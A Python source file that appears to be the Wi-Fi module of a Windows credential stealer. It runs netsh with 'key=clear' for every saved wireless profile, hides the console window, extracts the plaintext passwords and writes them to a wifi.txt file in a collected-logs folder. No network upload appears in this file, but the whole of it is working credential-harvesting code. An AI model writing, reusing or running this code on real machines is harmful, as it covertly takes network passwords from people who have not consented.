# Do not change subprocess.run to subprocess.check_output
# It will throw an exception when there is no Wifi profiles

from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
from re import findall, search
from os import environ
from preferences.config import config
from manager.logger import Log

def Wifi():
    user = environ['USERPROFILE']
    pathToLogs = f'{config.pathToLogs}\\System'
    logs = []
    startupinfo = STARTUPINFO()
    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
    try:
        profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], shell=True, capture_output=True, text=True, startupinfo=startupinfo)
        profile_names = findall(':\s(.+)', profiles_output.stdout)

        wifi_passwords = {}

        for profile in profile_names:
            password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, text=True, capture_output=True, startupinfo=startupinfo)
            password = search('Key Content\s+:\s(.+)', password_output.stdout)

            if password:
                wifi_passwords[profile] = password.group(1)
            else:
                wifi_passwords[profile] = None

        passwords = wifi_passwords

        for profile, password in passwords.items():
            profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
            if password != None:
                password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')

            logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')

        with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
            for log in logs:
                f.write(log+'\n')
    except Exception as e:
        Log(f"Wifi ---> {e}")